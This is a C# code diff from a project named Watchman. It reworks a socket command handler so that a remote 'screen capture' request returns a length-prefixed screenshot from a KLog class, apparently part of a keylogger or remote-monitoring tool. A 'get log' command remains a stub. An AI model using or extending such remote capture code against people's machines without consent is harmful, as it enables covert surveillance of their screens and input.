@@ -127,22 +127,34 @@ namespace Watchman
                 string text = Encoding.ASCII.GetString(dataBuffer);
 
                 byte[] data;
-                if (text.ToLower() == "screen capture")
+                switch (text.ToLower())
                 {
-                    data = KLog.RemoteTakeScreen();
-                }
-                else if (text.ToLower() == "get log")
-                {
-                    //TODO: Get Data
-                    data = Encoding.ASCII.GetBytes("Unknown request");
-                }
-                else
-                {
-                    data = Encoding.ASCII.GetBytes("Unknown request");
+                    case "screen capture":
+                        {
+                    
+                            byte[] currentData = KLog.RemoteTakeScreen();
+                            using (MemoryStream ms = new MemoryStream(new byte[currentData.Length + 4]))
+                            {
+                                byte[] size = BitConverter.GetBytes(currentData.Length);
+                                ms.Write(size, 0, 4);
+                                ms.Write(currentData, 0, currentData.Length);
+                                data = ms.ToArray();
+                                ms.Close();
+                            }
+                    
+                        }
+                        break;
+                    case "get log":
+                        data = Encoding.ASCII.GetBytes("Unknown request");
+                        break;
+                    default:
+                        data = Encoding.ASCII.GetBytes("Unknown request");
+                        break;
                 }
 
                 //Do your thing then
                 socket.BeginSend(data, 0, data.Length, SocketFlags.None, SendCallback, socket);
+                
                 socket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReceiveCallback,
                                     socket);
             }
